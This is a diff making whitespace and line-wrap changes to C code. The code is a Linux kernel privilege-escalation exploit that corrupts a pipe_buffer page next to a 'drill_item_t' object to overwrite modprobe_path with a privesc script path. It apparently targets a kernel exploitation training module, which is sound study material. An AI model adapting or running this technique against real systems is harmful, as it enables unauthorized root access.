@@ -245,8 +245,7 @@ int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 	return EXIT_SUCCESS;
 }
 
-int find_and_change_modprobe_path(char *pipe_data, char *modprobe_path,
-				  char *privesc_script_path)
+int find_and_change_modprobe_path(char *pipe_data, char *modprobe_path, char *privesc_script_path)
 {
 	size_t modprobe_path_len = strlen(modprobe_path);
 	unsigned long modprobe_path_start = MODPROBE_PATH_VADDR & (PAGE_SIZE - 1);
@@ -382,7 +381,7 @@ int main(void)
 	 *    which is exactly at the offset 0 of the next object near drill_item_t.
 	 */
 	printf("[!] trying to overwrite pipe_buffer.page after drill_item_t with 0x%lx...\n",
-			MODPROBE_PATH_PAGE_ADDR);
+	       MODPROBE_PATH_PAGE_ADDR);
 	snprintf(act_args, sizeof(act_args), "0x%lx 80", MODPROBE_PATH_PAGE_ADDR);
 	ret = act(act_fd, DRILL_ACT_SAVE_VAL, 0, act_args);
 	if (ret == EXIT_FAILURE)
@@ -416,7 +415,7 @@ int main(void)
 		}
 
 		printf("[+] wrote the page containing new modprobe_path %s back to the pipe %ld\n",
-				privesc_script_path, corrupted_pipe_n);
+		       privesc_script_path, corrupted_pipe_n);
 		break;
 	}
 
@@ -428,7 +427,7 @@ int main(void)
 	ret = strncmp(new_modprobe_path, privesc_script_path, KMOD_PATH_LEN);
 	if (ret != 0) {
 		printf("[-] new modprobe_path %s is not privesc_script_path %s\n",
-				new_modprobe_path, privesc_script_path);
+		       new_modprobe_path, privesc_script_path);
 		goto end;
 	}
 	printf("[+] overwritten modprobe_path: %s\n", new_modprobe_path);
@@ -444,7 +443,7 @@ int main(void)
 	ret = strncmp(new_modprobe_path, modprobe_path, KMOD_PATH_LEN);
 	if (ret != 0) {
 		printf("[-] the privesc script failed to restore modprobe_path: %s\n",
-				new_modprobe_path);
+		       new_modprobe_path);
 		goto end;
 	}
 	printf("[+] restored modprobe_path: %s\n", new_modprobe_path);
